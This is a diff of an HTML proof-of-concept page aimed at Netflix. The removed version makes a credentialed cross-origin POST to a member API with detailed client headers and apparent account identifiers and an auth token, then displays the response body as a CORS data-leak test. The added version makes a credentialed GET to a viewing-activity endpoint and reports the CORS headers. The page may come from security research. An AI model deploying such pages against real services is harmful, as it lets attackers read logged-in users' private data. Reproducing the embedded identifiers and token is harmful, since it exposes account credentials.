@@ -1,58 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Netflix Credentialed CORS Leak PoC</title>
+  <title>Netflix ACAO Reflection Test</title>
 </head>
 <body>
-  <h1>Netflix CORS Leak Test</h1>
+  <h1>Netflix ACAO / ACAC Header Test</h1>
   <pre id="output">Running test...</pre>
   <script>
-    const url = "https://www.netflix.com/nq/website/memberapi/release/pathEvaluator";
+    const url = "https://www.netflix.com/api/shakti/v1a7e3d37/viewingactivity"; // or swap in another
 
-    const headers = {
-      "Accept": "*/*",
-      "Content-Type": "application/x-www-form-urlencoded",
-      "X-Netflix.Client.Request.Name": "ui/falcorUnclassified",
-      "X-Netflix.Clienttype": "akira",
-      "X-Netflix.Osname": "Windows",
-      "X-Netflix.Osversion": "10.0",
-      "X-Netflix.Browsername": "Edge OSS",
-      "X-Netflix.Browserversion": "140",
-      "X-Netflix.Uiversion": "v2ac0f851",
-      "X-Netflix.Request.Id": "e517760b5bd2423db54ab8aba4aa4fad",
-      "X-Netflix.Esn": "NFCDIE-03-LLHP508JR8WMWRQCXA91834NCCXH4X",
-      "X-Netflix.Esnprefix": "NFCDIE-03-",
-      "X-Netflix.Osfullname": "Windows 10",
-      "X-Netflix.Request.Attempt": "1",
-      "X-Netflix.Nq.Stack": "prod",
-      "X-Netflix.Request.Client.Context": '{"appstate":"foreground"}',
-      "X-Netflix.Request.Client.User.Guid": "METDLIR5VZD57LS25UMMJY5RQA"
-    };
-
-    const body = `path=%5B%22locos%22%2C%22NES_4678FF92202938917EA486F54BB936_p_1757936476821%22%2C%5B4%2C5%2C6%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%2C31%2C32%2C33%2C34%2C35%2C36%2C37%2C38%2C39%2C40%2C41%2C42%2C43%2C44%2C45%2C46%2C47%2C48%2C49%2C50%5D%2C%22componentSummary%22%5D&path=%5B%22locos%22%2C%22NES_4678FF92202938917EA486F54BB936_p_1757936476821%22%2C%5B4%2C5%2C6%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%2C31%2C32%2C33%2C34%2C35%2C36%2C37%2C38%2C39%2C40%2C41%2C42%2C43%2C44%2C45%2C46%2C47%2C48%2C49%2C50%5D%2C%22page%22%2C0%2C%7B%22from%22%3A0%2C%22to%22%3A20%7D%2C%22itemSummary%22%5D&path=%5B%22locos%22%2C%22NES_4678FF92202938917EA486F54BB936_p_1757936476821%22%2C%5B4%2C5%2C6%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%2C31%2C32%2C33%2C34%2C35%2C36%2C37%2C38%2C39%2C40%2C41%2C42%2C43%2C44%2C45%2C46%2C47%2C48%2C49%2C50%5D%2C%22page%22%2C0%2C%7B%22from%22%3A0%2C%22to%22%3A20%7D%2C%22reference%22%2C%5B%22availability%22%2C%22episodeCount%22%2C%22inRemindMeList%22%2C%22queue%22%2C%22summary%22%5D%5D&authURL=c1.1757936598559.AgiMlOvcAxIgcDsWIZKrDn7awQ52xqciK8J9NjFqKN%2FkJgBfXk7ON6QYAg%3D%3D`;
-
-    async function testCORSLeak() {
+    async function testHeaders() {
       try {
         const res = await fetch(url, {
-          method: "POST",
-          headers,
-          body,
+          method: "GET",
           credentials: "include"
         });
-
-        const text = await res.text();
 
         document.getElementById("output").textContent =
           `✅ STATUS: ${res.status}\n` +
           `ACAO: ${res.headers.get("access-control-allow-origin")}\n` +
-          `ACAC: ${res.headers.get("access-control-allow-credentials")}\n\n` +
-          `BODY PREVIEW:\n${text.slice(0, 1500)}...`;
+          `ACAC: ${res.headers.get("access-control-allow-credentials")}`;
       } catch (err) {
-        document.getElementById("output").textContent = `❌ Error: ${err}`;
+        document.getElementById("output").textContent =
+          `❌ Error: ${err}`;
       }
     }
 
-    testCORSLeak();
+    testHeaders();
   </script>
 </body>
 </html>
